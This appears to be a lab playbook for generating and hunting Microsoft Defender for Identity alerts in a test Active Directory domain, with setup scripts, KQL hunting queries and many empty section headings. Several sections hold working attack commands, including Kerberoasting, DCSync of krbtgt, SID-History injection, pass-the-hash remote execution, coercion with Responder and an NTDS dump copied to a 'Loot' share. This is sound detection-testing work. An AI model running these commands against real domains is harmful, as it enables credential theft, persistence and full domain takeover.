---
ref: mdi-playbook
title: Microsoft Defender for Identity Attack Playbook
date: 2024-04-07T00:00:00+00:00
layout: page
lang: en
permalink: /mdi
sitemap: false
---

## Table of Contents
{:.no_toc}

* This is a TOC placeholder.
{:toc}

## 0. Lab Setup

### Virtual Machines

#### GPOs and CA Auditing

```powershell
Install-Module -Name DefenderForIdentity -Force
Set-MDIConfiguration -Mode Domain -Configuration All -Identity 'svc_mdi$' -Verbose
Set-MDIConfiguration -Mode LocalMachine -Configuration CAAuditing -Verbose
```

#### Create MDI Service Accounts

```powershell
# Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-8)

# Create the service account
New-ADServiceAccount -Name svc_mdi -RestrictToOutboundAuthenticationOnly

# Configure password retrieval
[string[]] $adfsServers = Get-ADComputer -Filter { Name -like '*adfs*' } | Select-Object -ExpandProperty SamAccountName
[string[]] $additionalPrincipals = @('Domain Controllers')
Set-ADServiceAccount -Identity svc_mdi -PrincipalsAllowedToRetrieveManagedPassword ($adfsServers + $additionalPrincipals)

# Get the deleted objects container's distinguished name:
$adDomain = Get-ADDomain -Current LoggedOnUser
$deletedObjectsDN = 'CN=Deleted Objects,{0}' -f $adDomain.DistinguishedName

# Grant the 'List Contents' and 'Read Property' permissions
dsacls.exe $deletedObjectsDN /takeOwnership
dsacls.exe $deletedObjectsDN /G 'svc_mdi$:LCRP'
```

#### Configure ADFS

```powershell
Set-AdfsProperties -AuditLevel Verbose

[string] $ConnectionString = 'server=\\.\pipe\MICROSOFT##WID\tsql\query;database=AdfsConfigurationV4;trusted_connection=true;'
$SQLConnection= New-Object System.Data.SQLClient.SQLConnection($ConnectionString)
$SQLConnection.Open()
$SQLCommand = $SQLConnection.CreateCommand()
$SQLCommand.CommandText = @"
USE [master];
CREATE LOGIN [CONTOSO\svc_mdi$] FROM WINDOWS WITH DEFAULT_DATABASE=[master];
USE [AdfsConfigurationV4];
CREATE USER [CONTOSO\svc_mdi$] FOR LOGIN [CONTOSO\svc_mdi$];
ALTER ROLE [db_datareader] ADD MEMBER [CONTOSO\svc_mdi$];
GRANT CONNECT TO [CONTOSO\svc_mdi$];
GRANT SELECT TO [CONTOSO\svc_mdi$];
"@
$SqlDataReader = $SQLCommand.ExecuteReader()
$SQLConnection.Close()
```

#### Validate MDI Config

```powershell
Install-Module -Name DefenderForIdentity
New-MDIConfigurationReport -Path "C:\Reports" -Mode Domain -Identity 'svc_mdi$' -OpenHtmlReport
Test-MDIDSA -Identity 'svc_mdi$' -Verbose -Detailed
Test-MDIConfiguration -Mode Domain -Configuration All -Verbose
Test-MDIConfiguration -Mode LocalMachine -Configuration All -Verbose
```

### Kali Linux

## 1. Reconnaissance and Discovery

### Account enumeration reconnaissance

Kerberos / NTLM scan

### Account Enumeration reconnaissance (LDAP)

cLDAP?

### Network-mapping reconnaissance (DNS)

```yaml
Learning period: 8 days
```

#### DNS SRV Enumeration

##### Attack

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"
```

#### Hunting Query

```kql
IdentityQueryEvents
| where Protocol  == "Dns"
| where QueryType == "Srv"
| where QueryTarget in ("_xmpp-server._tcp.contoso.com","_http._tcp.kali.download")
```

#### AXFR

##### Attack

```bash
nmap contoso-dc.contoso.com --script dns-zone-transfer --script-args "dns-zone-transfer.domain='contoso.com'"
```

##### Hunting Query

```kql
IdentityQueryEvents
| where  Protocol  == "Dns"
| where  QueryType == "Axfr"
```

#### DNS Brute Force

```bash
rm names.txt
mp64 --output-file=names.txt CONTOSO-P?u?d
cat names.txt
dnsrecon --domain contoso.com --dictionary names.txt --type brt
```

#### DNS Enumeration over LDAP

```bash
adidnsdump --user CONTOSO\\john --password 'Pa$$w0rd' --print-zones --ssl contoso-dc.contoso.com
```

```bash
adidnsdump --user CONTOSO\\john --password 'Pa$$w0rd' --zone contoso.com --ssl --verbose contoso-dc.contoso.com
```

### User and IP address reconnaissance (SMB)

SMB session enumeration against a DC

```bash
netexec smb --sessions --loggedon-users --shares -u john -p 'Pa$$w0rd' -d contoso.com '10.213.0.0/24'
```

???

### User and Group membership reconnaissance (SAMR)

#### Attack

```cmd
net accounts /domain
net user /domain
net group /domain
```

```yaml
Learning period: 30 days
```

#### Hunting Query

```kql
IdentityQueryEvents
| where Protocol  == "Samr"
| project Timestamp,QueryType,QueryTarget,AccountName,AccountSid,DeviceName,DestinationDeviceName
```

```kql
IdentityQueryEvents
| where Protocol  == "Samr"
| join (IdentityInfo) on $left.AccountSid ==$right.OnPremSid
| project-rename TranslatedAccountName = AccountName1
| project Timestamp,QueryType,QueryTarget,TranslatedAccountName,DeviceName,DestinationDeviceName
| sort by Timestamp
```

### Active Directory attributes reconnaissance (LDAP)

### Honeytoken was queried via SAM-R

### Honeytoken was queried via LDAP

### Suspicious Okta account Enumeration

### Suspicious LDAP query

## Privilege Escalation

### Suspected Netlogon privilege elevation attempt (CVE-2020-1472 exploitation)

### Suspicious modification of a dNSHostName attribute (CVE-2022-26923)

### Suspicious Kerberos delegation attempt by a newly created computer

### Suspicious Domain Controller certificate request (ESC8)

### Suspicious modifications to the AD CS security permissions/settings

### Suspicious modification of the trust relationship of AD FS server

### Suspicious modification of the Resource Based Constrained Delegation attribute by a machine account

## Persistence

### Suspected Golden Ticket usage (encryption downgrade)

### Suspected Golden Ticket usage (nonexistent account)

### Suspected Golden Ticket usage (ticket anomaly)

### Suspected Golden Ticket usage (ticket anomaly using RBCD)

### Suspected Golden Ticket usage (time anomaly)

### Suspected skeleton key attack (encryption downgrade)

### Suspicious additions to sensitive groups

### Honeytoken user attributes modified

### Honeytoken group membership changed

### Suspected SID-History injection

```powershell
$domainAdmins = Get-ADGroup -Identity 'Domain Admins'

Stop-Service -Name NTDS -Force

Add-ADDBSidHistory -SamAccountName john `
                   -SidHistory $domainAdmins.SID `
                   -DatabasePath 'C:\Windows\NTDS\ntds.dit' `
                   -Force

Start-Service -Name NTDS
```


### Suspicious modification of domain AdminSdHolder

```powershell
# Modify AdminSDHolder permissions
$adminSDHolder = 'CN=AdminSDHolder,CN=System,{0}' -f (Get-ADDomain).DistinguishedName
dsacls.exe $adminSDHolder /G 'john:RPWP;msDS-KeyCredentialLink'

# Force ACL propagation
$pdc = (Get-ADDomain).PDCEmulator
$rootDSE = [adsi] "LDAP://$pdc/RootDSE"
$rootDSE.UsePropertyCache = $false
$rootDSE.Put('runProtectAdminGroupsTask', 1)
$rootDSE.SetInfo()
```

## Credential Access

### Suspected Brute Force attack (LDAP)

### Suspected Golden Ticket usage (forged authorization data)

### Malicious request of Data Protection API master key

```powershell
Get-LsaBackupKey -Server CONTOSO-DC
```

### Suspected Brute Force attack (Kerberos, NTLM)

### Security principal reconnaissance (LDAP)

```yml
Learning period: 15 days per computer, starting from the day of the first event, observed from the machine.
```

### Suspected Kerberos SPN exposure

```cmd
Rubeus.exe kerberoast /domain:contoso.com /nowrap
```

### Suspected AS-REP Roasting attack

```cmd
Rubeus.exe asreproast /nowrap
```

### Suspicious modification of a sAMNameAccount attribute (CVE-2021-42278 and CVE-2021-42287 exploitation)

### Honeytoken authentication activity

### Suspected DCSync attack (replication of directory services)

```powershell
Install-Module -Name DSInternals -Force
Get-ADReplAccount -SamAccountName krbtgt -Server $env:USERDNSDOMAIN
```

### Suspected AD FS DKM key read

#### LDAP

```powershell
 [adsisearcher]::new('LDAP://CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com','(thumbnailPhoto=*)', 'thumbnailPhoto').FindAll() |
    ForEach-Object { [System.BitConverter]::ToString($PSItem.Properties['thumbnailPhoto'][0]) }
```

#### ADWS

```powershell
Get-ADObject -SearchBase 'CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com' `
             -LDAPFilter '(thumbnailPhoto=*)' `
             -Properties thumbnailPhoto |
    ForEach-Object { [System.BitConverter]::ToString($PSItem.thumbnailPhoto) }
```

### Suspected DFSCoerce attack using Distributed File System Protocol

```bash
~/env-pytools/bin/coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip contoso-dc.contoso.com --listener-ip 10.213.0.100 --always-continue
```

```bash
responder -I eth0
```

### Suspicious Kerberos delegation attempt using BronzeBit method (CVE-2020-17049 exploitation)

### Abnormal Active Directory Federation Services (AD FS) authentication using a suspicious certificate

### Suspected account takeover using shadow credentials

```cmd
whisker.exe add /target:Admin
```

### Suspected suspicious Kerberos ticket request

### Password spray against OneLogin

### Suspicious OneLogin MFA fatigue

### Possible NetSync attack

## Lateral Movement

### Suspected exploitation attempt on Windows Print Spooler service

### Remote code execution attempt over DNS

### Suspected identity theft (pass-the-hash)

### Suspected identity theft (pass-the-ticket)

### Suspected NTLM authentication tampering

### Suspected NTLM relay attack (Exchange account)

### Suspected overpass-the-hash attack (Kerberos)

```cmd
Rubeus.exe asktgt /user:Admin /domain:contoso.com /ptt /enctype:AES256 /rc4:92937945b518814341de3f726500d4ff
```

### Suspected rogue Kerberos certificate usage

### Suspected SMB packet manipulation (CVE-2020-0796 exploitation)

### Suspicious network connection over Encrypting File System Remote Protocol

### Exchange Server Remote Code Execution (CVE-2021-26855)

### Suspected Brute Force attack (SMB)

### Suspected WannaCry ransomware attack

### Suspected use of Metasploit hacking framework

### Suspicious certificate usage over Kerberos protocol (PKINIT)

### Suspected over-pass-the-hash attack (forced encryption type)

## Other

### Suspected DCShadow attack (domain controller promotion)

### Suspected DCShadow attack (domain controller replication request)

### Suspicious VPN connection

### Remote code execution attempt

```bash
impacket-wmiexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com' systeminfo
```

```bash
impacket-psexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com' hostname
```

```bash
impacket-smbexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com'
systeminfo
```

```powershell
Invoke-Command -ComputerName CONTOSO-DC -ScriptBlock { systeminfo }
```

### Suspicious service creation

### Suspicious communication over DNS

### Data exfiltration over SMB

```cmd
ntdsutil.exe "ac in ntds" ifm "create full C:\ADBackup" quit quit
robocopy.exe C:\ADBackup \\local\Loot\ADBackup /S /NDL /NJH /NJS
```

### Suspicious deletion of the certificate database entries

### Suspicious disable of audit filters of AD CS

### Directory Services Restore Mode Password Change

### Possible Okta session theft

### Possible takeover of a Microsoft Entra seamless SSO account

### Suspicious SPN was added to a user

### Suspicious creation of ESXi group
